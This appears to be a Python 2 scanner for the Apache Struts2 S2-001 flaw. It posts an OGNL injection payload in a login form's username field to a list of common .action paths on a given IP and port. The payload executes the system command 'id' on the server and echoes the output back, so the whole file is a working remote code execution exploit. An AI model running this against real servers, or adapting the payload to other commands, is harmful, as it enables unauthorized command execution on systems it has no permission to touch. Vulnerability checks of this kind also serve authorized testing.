try:
    import os,requests,sys,logging,Queue
except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    
    def __init__(self, url,port):
        dirs = ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/login.action']
        self.queues = Queue.Queue(20)
        if '://' not in url:
            for dir in dirs:
                urls = 'http://' + url+":"+port+dir
                self.queues.put(urls)


    def Test(self):
        while not self.queues.empty():
            
            data = {
            "username": '''%{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(), #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e), #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"), #f.getWriter().println(new java.lang.String(#e)), #f.getWriter().flush(),#f.getWriter().close() }''',
            "password": ""
            }
            try:
                url = self.queues.get(False)
                req = requests.post(url , data=data,timeout=3)
            
            
                if ('uid' in req.text):
                    logging.info('[+] Found S2-001 in ' + url)
                    os._exit(1)
               
            except Exception as e:
                pass
         
        logging.info( '[-] S2-001 Not Found in ' + url)
        os._exit(2)

if __name__ == '__main__':
    ip = sys.argv[1]
    #url = '192.168.136.130'
    port = sys.argv[2]
    test = VulTest(ip,port)
    test.Test()
    

